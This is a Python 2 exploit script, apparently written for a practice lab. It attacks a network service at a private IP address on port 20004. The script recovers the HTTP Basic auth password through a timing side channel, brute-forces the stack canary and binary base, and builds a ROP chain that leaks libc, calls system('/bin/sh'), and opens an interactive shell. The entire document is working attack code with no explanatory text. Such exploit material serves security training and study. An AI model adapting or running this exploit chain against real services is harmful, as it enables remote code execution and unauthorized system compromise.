from err0rless import connst, conns, dump
from struct import pack, unpack
import re, string, base64, time, socket, telnetlib

def send_request(password, ret_conn=0):
	s = conns("192.168.95.152", 20004)
	
	r  = "GET / HTTP/1.0\r\n"
	r += "Authorization: Basic "
	r += base64.b64encode(password)
	r += "\r\n"

	s.send(r + "\r\n")
	if ret_conn:
		return s
	else:
		return s.recv(1024)

def leak_password():
	print "in leak_password() ..."
	scope = re.findall('[0-9a-zA-Z]', string.printable)
	p = ""

	for i in range(0x10): # Byte-by-byte
		tl = []

		for c in scope:
			start = time.time()
			
			send_request(p + c)

			elapsed = time.time() - start
			tl.append(elapsed)

		p += scope[tl.index(min(tl))]
		print p[-1:],

	print "\n" + p
	return p

def leak_canary(auth_password):
	print "in leak_canary() ..."
	canary = ""
	for i in range(4):
		for j in range(0xFF):
			r   = auth_password + "A" * 2032 + canary + chr(j)
			rec = send_request(r)

			if "terminated" not in rec:
				print hex(j),
				canary += chr(j)
				break

	print "\nCanary : " + hex(unpack("I", canary)[0]) + "\n"
	return canary

def leak_binary_base(password, canary):
	print "in leak_binary_base() ..."
	for base in range(0xb7500000, 0xb8000000, 0x1000):
		r  = password
		r += "A" * 2032
		r += canary * 8 # padding

		r += pack("I", base + 0x10db) # pop ebx ; ret
		r += pack("I", base + 0x4118)

		r += pack("I", base + 0x0F30) # write.plt
		r += pack("I", 0x01) * 2
		r += pack("I", base + 0x2F1B) # "setrlimit" ; string
		r += pack("I", 0x0A)
		
		if base % 0x80000 == 0: print "Now base : " + hex(base)

		try:
			rec = send_request(r)
			if "setrlimit" in rec:
				print "\nBase address : " + hex(base) + "\n"
				return base
		except socket.error:
			pass

def pMain():
	# Verify that the password is correct
	while True:
		password = leak_password()
		rec = send_request(password)
		
		if "Unauth" not in rec:
			break

	print "Password : " + password + "\n"
	
	canary = leak_canary(password)
	base   = leak_binary_base(password, canary)

	p  = password
	p += "A" * 2032
	p += canary * 8 # padding

	p += pack("I", base + 0x10db) # pop ebx ; ret
	p += pack("I", base + 0x4118)

	p += pack("I", base + 0x0F30) # write.plt
	p += pack("I", base + 0x179c) # p-p-p-ret
	p += pack("I", 0x01)
	p += pack("I", base + 0x41B0) # srand@got
	p += pack("I", 4)

	for i in range(2):
		# first read does not work. :(
		p += pack("I", base + 0x10db) # pop ebx ; ret
		p += pack("I", base + 0x4118)

		p += pack("I", base + 0x0D20) # read.plt
		p += pack("I", base + 0x179c) # p-p-p-ret
		p += pack("I", 0x00)
		p += pack("I", base + 0x43f0) # .bss
		p += pack("I", 0x30)

	p += pack("I", base + 0x179e) # pop ebp ; ret
	p += pack("I", base + 0x43ec) # .bss
	p += pack("I", base + 0x1adf) # leave ; ret

	s = send_request(p, 1)
	system = unpack("I", s.recv(4))[0] + 0x9b60

	execp  = pack("I", system)
	execp += pack("I", 0x44444444)
	execp += pack("I", base + 0x43fc) # &command

	time.sleep(1)
	s.send(execp + "/bin/sh\n")
	
	t = telnetlib.Telnet()
	t.sock = s

	t.interact()

if __name__ == "__main__":
	pMain()
